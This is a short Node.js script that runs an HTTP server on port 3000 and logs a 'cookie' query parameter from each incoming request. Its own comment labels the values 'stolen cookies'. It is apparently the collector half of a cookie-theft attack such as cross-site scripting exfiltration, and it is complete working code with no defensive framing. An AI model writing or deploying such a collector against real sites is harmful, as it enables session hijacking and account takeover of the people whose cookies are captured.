const http = require('http');
const url = require('url');

const server = http.createServer((req, res) => {
    const queryObject = url.parse(req.url, true).query;
    console.log('Cookies:', queryObject.cookie);  // Log the stolen cookies
    res.writeHead(200, {'Content-Type': 'text/plain'});
    res.end('Cookie received');
});

server.listen(3000, () => {
    console.log('Server running at http://localhost:3000/');
});
